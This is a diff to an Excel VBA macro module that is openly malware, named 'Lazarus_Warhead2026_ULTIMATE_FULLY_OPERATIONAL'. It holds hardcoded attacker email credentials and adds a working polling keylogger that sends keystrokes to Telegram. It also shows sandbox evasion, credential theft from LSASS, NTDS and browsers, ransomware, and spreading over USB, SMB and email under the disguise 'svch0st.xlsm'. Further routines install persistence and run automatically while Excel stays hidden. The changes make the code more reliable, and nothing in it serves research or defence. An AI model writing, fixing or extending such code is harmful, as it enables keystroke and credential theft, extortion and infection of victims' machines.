@@ -1,4 +1,4 @@
-Attribute VB_Name = "Lazarus_Warhead2026_Ultimate_VBA_IMPOSSIBLE"
+Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_FULLY_OPERATIONAL"
 Option Explicit
 
 ' ========================
@@ -9,8 +9,7 @@ Private Const CRYPT_VERIFYCONTEXT As Long = &HF0000000
 Private Const CRYPT_SILENT As Long = &H40
 Private Const TH32CS_SNAPPROCESS As Long = &H2
 Private Const CRYPT_STRING_BASE64 As Long = 1
-Private Const WH_KEYBOARD_LL As Long = 13
-Private Const WM_KEYDOWN As Long = &H100
+Private Const SM_MOUSEPRESENT As Long = 19
 
 ' ========================
 ' ATTACKER CREDENTIALS
@@ -25,7 +24,7 @@ Private Const SMTP_USERNAME As String = "daliamarymorito@gmail.com"
 Private Const SMTP_PASSWORD As String = "@apple12345"
 
 ' ========================
-' API DECLARATIONS (VBA7 with fallback)
+' API DECLARATIONS (VBA7 + fallback for 32‑bit)
 ' ========================
 #If VBA7 Then
     Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
@@ -35,11 +34,10 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
     Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibName As String) As LongPtr
     Private Declare PtrSafe Function FreeLibrary Lib "kernel32" (ByVal hLibModule As LongPtr) As Long
-    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
-    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
     Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As LongPtr
     Private Declare PtrSafe Function Process32First Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As PROCESSENTRY32) As Long
     Private Declare PtrSafe Function Process32Next Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As PROCESSENTRY32) As Long
+    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
     Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
     Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
@@ -58,27 +56,18 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
     Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
     Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
-    Private Declare PtrSafe Function SetWindowsHookExA Lib "user32" (ByVal idHook As Long, ByVal lpfn As LongPtr, ByVal hmod As LongPtr, ByVal dwThreadId As Long) As LongPtr
-    Private Declare PtrSafe Function CallNextHookEx Lib "user32" (ByVal hhk As LongPtr, ByVal nCode As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
-    Private Declare PtrSafe Function UnhookWindowsHookEx Lib "user32" (ByVal hhk As LongPtr) As Long
-    Private Declare PtrSafe Function GetMessageA Lib "user32" (lpMsg As MSG, ByVal hWnd As LongPtr, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
-    Private Declare PtrSafe Function TranslateMessage Lib "user32" (lpMsg As MSG) As Long
-    Private Declare PtrSafe Function DispatchMessageA Lib "user32" (lpMsg As MSG) As LongPtr
     Private Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal hwnd As LongPtr) As Long
     Private Declare PtrSafe Function CloseClipboard Lib "user32" () As Long
     Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
     Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
     Private Declare PtrSafe Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As LongPtr) As Long
-    Private Declare PtrSafe Function GetKeyNameTextA Lib "user32" (ByVal lParam As Long, ByVal lpString As String, ByVal nSize As Long) As Long
-    Private Declare PtrSafe Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
     Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long
     Private Declare PtrSafe Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
 #Else
-    ' Fallback for 32-bit Office (non-PtrSafe)
     Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
     Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
     Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
@@ -86,11 +75,10 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
     Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibName As String) As Long
     Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
-    Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
-    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
     Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
     Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
     Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
+    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
     Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
     Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
     Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
@@ -109,20 +97,12 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
     Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
-    Private Declare Function SetWindowsHookExA Lib "user32" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
-    Private Declare Function CallNextHookEx Lib "user32" (ByVal hhk As Long, ByVal nCode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
-    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hhk As Long) As Long
-    Private Declare Function GetMessageA Lib "user32" (lpMsg As MSG, ByVal hWnd As Long, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
-    Private Declare Function TranslateMessage Lib "user32" (lpMsg As MSG) As Long
-    Private Declare Function DispatchMessageA Lib "user32" (lpMsg As MSG) As Long
     Private Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
     Private Declare Function CloseClipboard Lib "user32" () As Long
     Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As Long
     Private Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
     Private Declare Function EmptyClipboard Lib "user32" () As Long
     Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
-    Private Declare Function GetKeyNameTextA Lib "user32" (ByVal lParam As Long, ByVal lpString As String, ByVal nSize As Long) As Long
-    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
     Private Declare Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long
     Private Declare Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
     Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
@@ -149,23 +129,6 @@ End Type
 Private Type POINTAPI
     x As Long
     y As Long
-End Type
-
-Private Type MSG
-    hwnd As LongPtr
-    message As Long
-    wParam As LongPtr
-    lParam As LongPtr
-    time As Long
-    pt As POINTAPI
-End Type
-
-Private Type KBDLLHOOKSTRUCT
-    vkCode As Long
-    scanCode As Long
-    flags As Long
-    time As Long
-    dwExtraInfo As LongPtr
 End Type
 
 Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
@@ -201,70 +164,12 @@ End Type
 ' ========================
 Private gMasterKey(31) As Byte
 Private gKeySet As Boolean
-Private gKeyloggerHook As LongPtr
 Private gKeylogBuffer As String
 Private gKeylogFile As String
 Private gRunFlag As String
 Private gMachineID As String
 Private gFirstRun As Boolean
-Private gUserFormHidden As Object
 Private gSelfPath As String
-
-' ========================
-' KEYLOGGER CALLBACK
-' ========================
-Private Function LowLevelKeyboardProc(ByVal nCode As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
-    On Error Resume Next
-    If nCode >= 0 Then
-        If wParam = WM_KEYDOWN Then
-            Dim p As KBDLLHOOKSTRUCT
-            CopyMemory p, ByVal lParam, Len(p)
-            Dim keyName As String: keyName = Space(32)
-            GetKeyNameTextA ((p.scanCode << 16) Or (p.flags << 24)), keyName, 32
-            keyName = Trim(keyName)
-            If Len(keyName) > 0 Then
-                If keyName = "Return" Then keyName = "[ENTER]"
-                If keyName = "Tab" Then keyName = "[TAB]"
-                If keyName = "Space" Then keyName = " "
-                If Len(keyName) = 1 And keyName Like "[A-Za-z]" Then
-                    If (GetKeyState(&H10) And &H8000) = 0 Then keyName = LCase(keyName)
-                End If
-                gKeylogBuffer = gKeylogBuffer & keyName
-                If Len(gKeylogBuffer) > 1000 Then
-                    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-                    Dim ts As Object: Set ts = fso.OpenTextFile(gKeylogFile, 8, True)
-                    ts.Write gKeylogBuffer
-                    ts.Close
-                    SendToTelegramChunked "KEYLOG|" & gKeylogBuffer
-                    gKeylogBuffer = ""
-                End If
-            End If
-        End If
-    End If
-    LowLevelKeyboardProc = CallNextHookEx(gKeyloggerHook, nCode, wParam, lParam)
-End Function
-
-' ========================
-' HIDDEN USERFORM FOR MESSAGE PUMP
-' ========================
-Private Sub StartKeyloggerWithPump()
-    gKeylogFile = GetTempDir() & "keylog.txt"
-    gKeyloggerHook = SetWindowsHookExA(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, GetModuleHandleA(vbNullString), 0)
-    If gKeyloggerHook = 0 Then Exit Sub
-    
-    ' Create a hidden UserForm to keep the message pump alive
-    Set gUserFormHidden = CreateObject("UserForm")
-    gUserFormHidden.Caption = "Hidden"
-    gUserFormHidden.Width = 0
-    gUserFormHidden.Height = 0
-    gUserFormHidden.Show vbModeless
-    
-    ' Message loop (simulated via DoEvents)
-    Do While gKeyloggerHook <> 0
-        DoEvents
-        Sleep 50
-    Loop
-End Sub
 
 ' ========================
 ' UTILITIES
@@ -366,6 +271,61 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ========================
+' POLLING KEYLOGGER (NON‑BLOCKING)
+' ========================
+Sub PollingKeylogger()
+    On Error Resume Next
+    Static lastKeys(255) As Integer
+    Dim i As Integer, state As Integer, keyName As String
+    
+    For i = 8 To 255
+        state = GetAsyncKeyState(i)
+        If state And &H8000 Then
+            If lastKeys(i) = 0 Then
+                lastKeys(i) = 1
+                keyName = GetKeyName(i)
+                If keyName <> "" Then
+                    gKeylogBuffer = gKeylogBuffer & keyName
+                    If Len(gKeylogBuffer) > 1000 Then
+                        Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+                        Dim ts As Object: Set ts = fso.OpenTextFile(gKeylogFile, 8, True)
+                        ts.Write gKeylogBuffer
+                        ts.Close
+                        SendToTelegramChunked "KEYLOG|" & gKeylogBuffer
+                        gKeylogBuffer = ""
+                    End If
+                End If
+            End If
+        Else
+            lastKeys(i) = 0
+        End If
+    Next i
+    
+    ' Schedule next run in 50ms
+    Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
+End Sub
+
+Function GetKeyName(vKey As Integer) As String
+    On Error Resume Next
+    Select Case vKey
+        Case 8: GetKeyName = "[BACKSPACE]"
+        Case 9: GetKeyName = "[TAB]"
+        Case 13: GetKeyName = "[ENTER]"
+        Case 16: GetKeyName = "[SHIFT]"
+        Case 17: GetKeyName = "[CTRL]"
+        Case 18: GetKeyName = "[ALT]"
+        Case 20: GetKeyName = "[CAPS]"
+        Case 32: GetKeyName = " "
+        Case 46: GetKeyName = "[DEL]"
+        Case 37 To 40: GetKeyName = "[ARROW]"
+        Case 48 To 57: GetKeyName = Chr(vKey)
+        Case 65 To 90:
+            If GetAsyncKeyState(16) And &H8000 Then GetKeyName = Chr(vKey) Else GetKeyName = LCase(Chr(vKey))
+        Case Else: GetKeyName = ""
+    End Select
+End Function
+
+' ========================
 ' EVASION
 ' ========================
 Function IsSandbox() As Boolean
@@ -387,7 +347,7 @@ Function IsSandbox() As Boolean
         CloseHandle snap
         If count < 20 Then IsSandbox = True: Exit Function
     End If
-    If GetSystemMetrics(19) <> 0 Then
+    If GetSystemMetrics(SM_MOUSEPRESENT) <> 0 Then
         Dim p1 As POINTAPI, p2 As POINTAPI
         GetCursorPos p1: StealthSleep 100: GetCursorPos p2
         If p1.x = p2.x And p1.y = p2.y Then IsSandbox = True: Exit Function
@@ -468,7 +428,7 @@ Sub ElevatePrivileges()
 End Sub
 
 ' ========================
-' DOMAIN CONTROLLER ATTACK (WITH ELEVATION CHECK)
+' DOMAIN CONTROLLER ATTACK
 ' ========================
 Function IsDomainController() As Boolean
     On Error Resume Next
@@ -535,7 +495,7 @@ Sub ExtractHashesFromNTDS()
 End Sub
 
 ' ========================
-' CREDENTIAL THEFT (LSASS, SAM, browser, cloud)
+' CREDENTIAL THEFT
 ' ========================
 Sub DumpLSASS()
     On Error Resume Next
@@ -657,6 +617,7 @@ Sub StealBrowserData()
         Dim subFolder As Object
         For Each subFolder In folder.SubFolders
             Dim ffFiles As Variant: ffFiles = Array("logins.json", "key4.db", "cookies.sqlite")
+            Dim file As Variant
             For Each file In ffFiles
                 Dim fullPath As String: fullPath = subFolder.Path & "\" & file
                 If fso.FileExists(fullPath) Then
@@ -679,7 +640,7 @@ Sub StealAllCredentials()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM) – FULLY CORRECTED
+' RANSOMWARE (AES-GCM)
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -858,24 +819,23 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION (USB, SMB, Email)
+' PROPAGATION
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim src As String: src = gSelfPath
-    If Not fso.FileExists(src) Then Exit Sub
+    If Not fso.FileExists(gSelfPath) Then Exit Sub
     Dim d As Object
     For Each d In fso.Drives
         If d.DriveType = 1 And d.IsReady Then
             Dim root As String: root = d.DriveLetter & ":\"
             Dim dst As String: dst = root & "svch0st.xlsm"
-            fso.CopyFile src, dst, True
+            fso.CopyFile gSelfPath, dst, True
             SetAttr dst, vbHidden + vbSystem
             Dim sysFolder As String: sysFolder = root & "System Volume Information"
             If Not fso.FolderExists(sysFolder) Then fso.CreateFolder sysFolder
             SetAttr sysFolder, vbHidden + vbSystem
-            fso.CopyFile src, sysFolder & "\svch0st.xlsm", True
+            fso.CopyFile gSelfPath, sysFolder & "\svch0st.xlsm", True
             SendToTelegram "USB_PROPAGATED|" & d.DriveLetter
         End If
     Next
@@ -926,7 +886,7 @@ Sub EmailPropagation()
 End Sub
 
 ' ========================
-' CHROME REMOTE DESKTOP (SIMPLIFIED)
+' CHROME REMOTE DESKTOP
 ' ========================
 Sub EnableChromeRemoteDesktop()
     On Error Resume Next
@@ -967,7 +927,7 @@ Sub DeployMiner()
 End Sub
 
 ' ========================
-' SOCIAL ENGINEERING HTA (WITH SCRIPT)
+' SOCIAL ENGINEERING HTA
 ' ========================
 Sub DeploySocialEngineeringUI()
     On Error Resume Next
@@ -1001,8 +961,20 @@ Sub DeploySocialEngineeringUI()
 End Sub
 
 ' ========================
-' PERSISTENCE (FULLY ROBUST)
+' PERSISTENCE (ROBUST)
 ' ========================
+Sub InstallPermanentCopy()
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim hiddenPath As String: hiddenPath = Environ("PROGRAMDATA") & "\Lazarus\"
+    If Not fso.FolderExists(hiddenPath) Then fso.CreateFolder hiddenPath
+    SetAttr hiddenPath, vbHidden + vbSystem
+    Dim dest As String: dest = hiddenPath & "Lazarus.xlsm"
+    fso.CopyFile gSelfPath, dest, True
+    SetAttr dest, vbHidden + vbSystem
+    gSelfPath = dest
+End Sub
+
 Sub PersistRegistry()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
@@ -1050,18 +1022,6 @@ Sub PersistStartupFolder()
     fso.CopyFile gSelfPath, startupPath & "Lazarus.xlsm", True
 End Sub
 
-Sub InstallPermanentCopy()
-    On Error Resume Next
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim hiddenPath As String: hiddenPath = Environ("PROGRAMDATA") & "\Lazarus\"
-    If Not fso.FolderExists(hiddenPath) Then fso.CreateFolder hiddenPath
-    SetAttr hiddenPath, vbHidden + vbSystem
-    Dim dest As String: dest = hiddenPath & "Lazarus.xlsm"
-    fso.CopyFile gSelfPath, dest, True
-    SetAttr dest, vbHidden + vbSystem
-    gSelfPath = dest
-End Sub
-
 Sub PersistAll()
     InstallPermanentCopy
     PersistRegistry
@@ -1072,15 +1032,15 @@ Sub PersistAll()
 End Sub
 
 ' ========================
-' MAIN EXECUTION (HIDES EXCEL, RUNS FOREVER)
+' MAIN EXECUTION (NON‑BLOCKING)
 ' ========================
 Sub AutoExec()
     On Error GoTo ErrorHandler
     If gRunFlag = "RUN" Then Exit Sub
     gRunFlag = "RUN"
     
-    ' Get current workbook path
     gSelfPath = ThisWorkbook.FullName
+    gKeylogFile = GetTempDir() & "keylog.txt"
     
     ' First run: enable macro settings
     If gFirstRun = False Then
@@ -1101,11 +1061,11 @@ Sub AutoExec()
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
-    ' Install persistence first
+    ' Install persistence (does not block)
     PersistAll
     
-    ' Start keylogger with hidden message pump (creates a hidden UserForm)
-    StartKeyloggerWithPump
+    ' Start non‑blocking polling keylogger
+    Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
     
     If IsDomainController() Then
         ExtractNTDSAndSYSTEM
@@ -1119,11 +1079,11 @@ Sub AutoExec()
         EmailPropagation
         RunRansomware
         DeploySocialEngineeringUI
-        ' Start clipboard monitor (non‑blocking)
-        Application.OnTime Now + TimeValue("00:00:01"), "ClipboardMonitorLoop"
+        ' Start non‑blocking clipboard monitor
+        Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
     End If
     
-    ' Hide Excel and keep it running
+    ' Hide Excel and keep it alive
     Application.Visible = False
     ThisWorkbook.Saved = True
     Do While True
